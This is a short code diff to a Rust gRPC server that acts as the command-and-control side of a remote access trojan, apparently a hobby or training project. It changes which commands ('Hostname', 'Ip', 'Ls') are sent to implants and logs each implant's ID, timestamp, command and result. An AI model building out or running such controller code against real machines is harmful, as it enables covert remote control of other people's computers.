@@ -11,8 +11,7 @@ pub struct MyAskForInstructions {}
 #[tonic::async_trait]
 impl AskForInstructions for MyAskForInstructions {
     async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
-        println!("Request={request:?}");
-        let fake_commands: Vec<RatCommand> = vec![RatCommand::Hostname, RatCommand::Help, RatCommand::Ls];
+        let fake_commands: Vec<RatCommand> = vec![RatCommand::Hostname, RatCommand::Ip, RatCommand::Ls];
         let number: usize = request.into_inner().requested_command.try_into().unwrap();
         if fake_commands.len() > number {
             Ok(Response::new(
@@ -39,7 +38,12 @@ pub struct MyRecordCommandResult {}
 #[tonic::async_trait]
 impl RecordCommandResult for MyRecordCommandResult {
     async fn send(&self, request: Request<CommandResponse>) -> Result<Response<Empty>, Status> {
-        println!("Request={request:?}");
+        let request = request.into_inner();
+        let implant_id = request.implant_id;
+        let timestamp = request.timestamp;
+        let command = request.command.to_string();
+        let result = request.result;
+        println!("{implant_id},{timestamp},{command},{result}");
         Ok(Response::new(
             Empty {}
         ))
